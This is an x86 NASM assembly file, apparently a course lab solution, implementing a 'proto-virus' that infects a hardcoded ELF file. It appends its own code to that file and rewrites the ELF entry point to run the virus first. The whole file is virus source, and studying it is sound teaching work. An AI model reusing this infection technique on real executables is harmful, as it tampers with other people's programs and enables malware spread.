%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro

%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_SET 0

%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20	
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8
%define ELFHDR_size 52
%define ELFHDR_phoff	28

%define FD dword [ebp - 4]
%define ELF_header ebp - 56 ; Subbing 56 because -4 for pc increment and 52 for elf header size 
%define original_entry ebp - 60

	global _start

	section .text
_start:	
	push	ebp
	mov	ebp, esp
	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage
	;CODE START
	; Open file in FileName
	call get_my_loc
	add ebx, FileName			; Opening file in FileName
	open ebx, RDWR, 0x777
	mov FD, eax

	; Checking if file is an elf file
	lea ecx, [ELF_header]		; Grabbing the effective address of elf header
	read FD, ecx, ELFHDR_size
	cmp dword [ELF_header], 0x464C457F
	jne not_elf

	; file is an ELF file, so we'll infect it
	jmp infect

infect:
	; Print Outstr to STDOUT
	call get_my_loc
	add ebx, OutStr
	write 1, ebx, 32

	; Infect the file
	lseek FD, 0, SEEK_END
	mov esi, eax				; Save file size in esi
	call get_my_loc
	add ebx, _start
	mov edx, virus_end - _start
	write FD, ebx, edx

	; Modify entry point
	lseek FD, 0, SEEK_SET
	mov eax, dword [ELF_header + ENTRY]
	mov dword [original_entry], eax ; Save original entry point
	mov eax, 0x8048000 			; ELF base address
	add eax, esi 				; Set eax to end of file
	mov dword [ELF_header + ENTRY], eax
	lea ecx, [ELF_header]		
	write FD, ecx, ELFHDR_size	; Writing the modified header
	
	; Changing return address
	lseek FD, -4, SEEK_END
	lea ecx, [original_entry]
	write FD, ecx, 4
	; lseek FD, 0, SEEK_SET

	close FD
	jmp VirusExit

not_elf:
	close FD
	call get_my_loc
	add ebx, Failstr
	write 1, ebx, 12
	exit -1

VirusExit:
       exit 0            ; Termination if all is OK and no previous code to jump to
                         ; (also an example for use of above macros)
	
FileName:	db "ELFexec", 0 ; default was with 1 but you gave us the file without it
OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
Failstr:    db "perhaps not", 10 , 0


get_my_loc:              ; puts location in ebx
	call next_i
next_i:
	pop ebx				; changed to ebx because this doesn't work with ecx 
	sub ebx, next_i		; need to add sub because it doesn't subtract the address which screws things up
	ret

PreviousEntryPoint: dd VirusExit
virus_end:
